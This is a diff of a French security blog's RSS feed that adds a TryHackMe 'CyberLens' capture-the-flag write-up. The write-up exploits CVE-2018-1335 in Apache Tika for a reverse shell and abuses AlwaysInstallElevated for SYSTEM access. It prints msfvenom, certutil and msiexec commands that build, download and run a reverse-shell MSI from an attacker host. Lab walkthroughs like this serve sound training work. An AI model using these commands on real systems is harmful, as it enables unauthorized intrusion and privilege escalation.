@@ -6,8 +6,197 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>fr</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 12 Jun 2024 21:19:39 -0500</lastBuildDate>
+        <lastBuildDate>Wed, 19 Jun 2024 14:37:09 -0500</lastBuildDate>
         <atom:link href="https://scorpiosec.com/fr/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM: CyberLens</title>
+            <link>https://scorpiosec.com/fr/posts/2024/06/thm-cyberlens/</link>
+            <pubDate>Wed, 19 Jun 2024 14:37:09 -0500</pubDate>
+            
+            <guid>https://scorpiosec.com/fr/posts/2024/06/thm-cyberlens/</guid>
+            <description>Platforme: TryHackMe Lien: CyberLens Niveau: Facile OS: Windows CyberLens présente un site web avec une fonction d&amp;rsquo;extraction de métadonnées. Après notre énumération, nous découvrons que cette fonction utilise Apache Tika, une version obsolète du logiciel vulnérable au CVE-2018-1335 est installée. Nous obtenons notre accès initial en exploitant cette vulnérabilité. Pour l&amp;rsquo;escalade des privilèges, nous abusons de AlwaysInstallElevated pour obtenir un shell système.
+Balayage Nous utiliserons un script Bash pour automatiser le balayage.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platforme: TryHackMe</li>
+<li>Lien: <a href="https://tryhackme.com/r/room/cyberlensp6" target="_blank" >CyberLens</a>
+
+</li>
+<li>Niveau: Facile</li>
+<li>OS: Windows</li>
+</ul>
+<hr>
+<p>CyberLens présente un site web avec une fonction d&rsquo;extraction de métadonnées. Après notre énumération, nous découvrons que cette fonction utilise Apache Tika, une version obsolète du logiciel vulnérable au <code>CVE-2018-1335</code> est installée. Nous obtenons notre accès initial en exploitant cette vulnérabilité. Pour l&rsquo;escalade des privilèges, nous abusons de <code>AlwaysInstallElevated</code> pour obtenir un shell système.</p>
+<h2 id="balayage">Balayage</h2>
+<p>Nous utiliserons un script Bash pour automatiser le balayage. Vous pouvez le trouver <a href="https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh" target="_blank" >ici</a>
+
+.</p>
+<p>Le script va :</p>
+<ul>
+<li>Scanner une IP cible pour les ports ouverts</li>
+<li>Les extraire</li>
+<li>Exécuter un scan détaillé sur les ports ouverts trouvés et sauvegarder le résultat dans trois formats différents (.gnmap, .nmap, et .xml)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 80,135,139,445,3389,5985,47001,49664,49665,49667,49668,49669,49670,49677,61777
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-06-19 15:27 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.212.189
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.23s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Apache httpd 2.4.57 <span style="color:#f92672">((</span>Win64<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-title: CyberLens: Unveiling the Hidden Matrix
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.57 <span style="color:#f92672">(</span>Win64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+</span></span><span style="display:flex;"><span>|_ssl-date: 2024-06-19T20:27:52+00:00; -20s from scanner time.
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   Target_Name: CYBERLENS
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: CYBERLENS
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: CYBERLENS
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: CyberLens
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: CyberLens
+</span></span><span style="display:flex;"><span>|   Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>|_  System_Time: 2024-06-19T20:27:42+00:00
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CyberLens
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-06-18T19:35:16
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-12-18T19:35:16
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49669/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49670/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49677/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
+</span></span><span style="display:flex;"><span>|_http-title: Welcome to the Apache Tika 1.17 Server
+</span></span><span style="display:flex;"><span>|_http-cors: HEAD GET
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: PUT
+</span></span><span style="display:flex;"><span>|_http-server-header: Jetty<span style="color:#f92672">(</span>8.y.z-SNAPSHOT<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-06-19T20:27:43
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -20s, deviation: 0s, median: -21s
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 70.15 seconds
+</span></span></code></pre></div><h2 id="enumération">Enumération</h2>
+<p>En visitant l&rsquo;adresse IP cible, nous trouvons un site web avec une fonction de téléchargement. Nous pouvons télécharger un fichier pour extraire ses métadonnées.</p>
+<p><img src="/images/THM-CyberLens/cyberlens-website.png" alt="CyberLens website"></p>
+<p>Après avoir capturé la requête que nous obtenons lorsque nous cliquons sur <code>Get Metadata</code>, nous constatons que le serveur web effectue une requête vers le port <code>61777</code>.</p>
+<p><img src="/images/THM-CyberLens/port-for-request.png" alt="Request to port 61777"></p>
+<p>En accédant au port, nous arrivons à une page web présentant Apache Tika 1.17.</p>
+<p><img src="/images/THM-CyberLens/Apache-Tika.png" alt="Apache Tika Server"></p>
+<p><strong>Il est possible de résoudre ce défi entièrement via Metasploit, cet article présentera la méthode manuelle et la méthode Metasploit.</strong></p>
+<h2 id="exploitation-manuelle">Exploitation manuelle</h2>
+<h3 id="accès-initial">Accès initial</h3>
+<p>Une recherche sur &ldquo;Apache Tika 1.17 rce&rdquo; nous conduit à <a href="https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/" target="_blank" >ce</a>
+
+ article de Rhino Security Labs présentant le CVE-2018-1335. Un PoC est également disponible <a href="https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2018-1335/CVE-2018-1335.py" target="_blank" >ici</a>
+
+. Pour l&rsquo;utiliser, nous devons suivre cet exemple :</p>
+<pre tabindex="0"><code>python3 CVE-2018-1335.py &lt;host&gt; &lt;port&gt; &lt;command&gt;
+</code></pre><p>Puisque nous ciblons une machine Windows, nous pouvons utiliser PowerShell pour obtenir un reverse shell.</p>
+<blockquote>
+<p>Sur <a href="https://www.revshells.com/" target="_blank" >revshells.com</a>
+
+, nous utilisons un reverse shell PowerShell #3 (base64)</p>
+</blockquote>
+<pre tabindex="0"><code>python3 CVE-2018-1335.py &lt;Target_IP&gt; &lt;PORT_NUMBER&gt; &lt;INSERT REVSHELL HERE&gt;
+</code></pre><p>Après exécution de notre commande, nous obtenons une connexion sur notre listener, nous avons un shell en tant qu&rsquo;utilisateur <code>cyberlens</code>.</p>
+<p><img src="/images/THM-CyberLens/initial-foothold.png" alt="Apache Tika Server"></p>
+<p>Nous trouvons le fichier <code>user.txt</code> sur le bureau de l&rsquo;utilisateur.</p>
+<p><img src="/images/THM-CyberLens/user-flag.png" alt="user.txt location"></p>
+<h3 id="elévation-de-privilèges">Elévation de Privilèges</h3>
+<p>Pour l&rsquo;énumération du système, nous utilisons <a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" target="_blank" >WinPEAS</a>
+
+ et nous découvrons que <code>AlwaysInstallElevated</code> est activé.</p>
+<p><img src="/images/THM-CyberLens/AlwaysInstallElevated.png" alt="Winpeas finds AlwaysInstallElevated is enabled"></p>
+<p>Le paramètre <code>AlwaysInstallElevated</code> de Windows est un paramètre de stratégie de groupe qui, lorsqu&rsquo;il est activé, permet à Windows Installer d&rsquo;installer des programmes avec des privilèges élevés (c&rsquo;est-à-dire des droits d&rsquo;administration), quel que soit le niveau de privilège actuel de l&rsquo;utilisateur. Ce paramètre est contrôlé par deux clés de registre:</p>
+<ol>
+<li><strong>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</strong></li>
+<li><strong>HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</strong></li>
+</ol>
+<p>Si ces deux clés de registre ont la valeur &ldquo;1&rdquo;, cela signifie que n&rsquo;importe quel utilisateur, y compris ceux qui n&rsquo;ont que des privilèges d&rsquo;utilisateur standard, peut installer des packages MSI avec des privilèges élevés (administrateur). <em>Vous pouvez en savoir plus à ce sujet <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated" target="_blank" >ici</a>
+
+.</em></p>
+<p><a href="https://juggernaut-sec.com/alwaysinstallelevated/#Abusing_AlwaysInstallElevated_to_Obtain_a_SYSTEM_Shell" target="_blank" >Cet article</a>
+
+ explique comment abuser de <code>AlwaysInstallElevated</code> pour obtenir un Shell SYSTEM.</p>
+<ol>
+<li>Nous créons un fichier msi malveillant</li>
+</ol>
+<pre tabindex="0"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.104.130 LPORT=1234 -a x64 --platform Windows -f msi -o evil.msi
+</code></pre><p><img src="/images/THM-CyberLens/malicious-msi.png" alt="Malicious msi ile created with msfvenom"></p>
+<ol start="2">
+<li>Ensuite, nous le téléchargeons sur la cible</li>
+</ol>
+<pre tabindex="0"><code>certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT_NUMBER/evil.msi evil.msi
+</code></pre><ol start="3">
+<li>Nous exécutons le fichier msi</li>
+</ol>
+<pre tabindex="0"><code>msiexec /quiet /qn /i evil.msi
+</code></pre><ol start="4">
+<li>Finalement nous obtenons une connexion sur notre listener en tant que <code>nt authority\system</code>.</li>
+</ol>
+<p><img src="/images/THM-CyberLens/system-shell.png" alt="System shell"></p>
+<p>Nous trouvons le fichier <code>admin.txt</code> sur le bureau de l&rsquo;administrateur.</p>
+<p><img src="/images/THM-CyberLens/root-flag-manual.png" alt="System shell"></p>
+<hr>
+<h2 id="méthode-metasploit">Méthode Metasploit</h2>
+<h3 id="accès-initial-1">Accès initial</h3>
+<p>Nous avons le nom du logiciel, donc nous cherchons des exploits dans Metasploit.</p>
+<p>Nous trouvons un exploit pour <code>Header Command Injection</code>.</p>
+<p><img src="/images/THM-CyberLens/apache-tika-exploit.png" alt="Metasploit fins exploit for Apache Tika"></p>
+<blockquote>
+<p>Assurez-vous de définir toutes les options correctement. Le port distant (RPORT) doit être <code>61777</code>.</p>
+</blockquote>
+<p>Après avoir exécuté le module, nous obtenons un shell meterpreter.</p>
+<p><img src="/images/THM-CyberLens/meterpreter-shell.png" alt="Meterpreter shell"></p>
+<h3 id="elévation-de-privilèges-1">Elévation de Privilèges</h3>
+<p>Pour élever nos privilèges, nous pouvons utiliser le <code>exploit_suggester</code> de Metasploit afin de trouver des pistes.</p>
+<blockquote>
+<p>Vous pouvez mettre en arrière-plan le shell meterpreter actuel avec <code>background</code></p>
+</blockquote>
+<p><img src="/images/THM-CyberLens/metasploit-privesc.png" alt="Metasploit exploit suggester for privilege escalation"></p>
+<p>Il suffit de fournir un numéro de session et d&rsquo;exécuter le module.</p>
+<p><img src="/images/THM-CyberLens/exploit-suggester.png" alt="Metasploit - Exploit suggester module use"></p>
+<p>Le module trouve cinq possibilités d&rsquo;exploitation pour notre cible.</p>
+<p><img src="/images/THM-CyberLens/exploits-list.png" alt="Exploits list found by exploit suggester in Metasploit"></p>
+<p>Normalement, nous devrions les essayer toutes, mais nous savons que notre cible est vulnérable à <code>AlwaysInstallElevated</code>.</p>
+<pre tabindex="0"><code>use exploit/windows/local/always_install_elevated
+</code></pre><p>Nous devons fournir un numéro de session, un hôte local et un port local.</p>
+<p><img src="/images/THM-CyberLens/installed-elevated-exploit.png" alt="AlwaysInstallElevated exploit in Metasploit"></p>
+<p>Après avoir exécuté le module, nous obtenons une session meterpreter élevée en tant que <code>NT AUTHORITY\SYSTEM</code>.</p>
+<p><img src="/images/THM-CyberLens/admin-shell.png" alt="Meterpreter system shell"></p>
+<h2 id="mots-de-fin">Mots de Fin</h2>
+<p>Si vous êtes un professionnel de la cybersécurité en devenir, la maîtrise de Metasploit vous sera d&rsquo;une grande utilité. Vous trouverez ci-dessous deux ressources qui vous seront utiles :</p>
+<ul>
+<li><a href="https://www.offsec.com/metasploit-unleashed/" target="_blank" >Metasploit Unleashed</a>
+
+ - Un cours gratuit d&rsquo;Offensive Security qui vous apprend à utiliser le framework de manière approfondie.</li>
+<li><a href="https://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X" target="_blank" >Metasploit: The Penetration Tester&rsquo;s Guide</a>
+
+ - Ce livre date de 2011, mais il vous permettra d&rsquo;approfondir votre compréhension de Metasploit. Si vous l&rsquo;appréciez, sachez que la deuxième édition sortira en novembre 2024.</li>
+</ul>
+]]></content>
+        </item>
         
         <item>
             <title>HTB: Crafty</title>
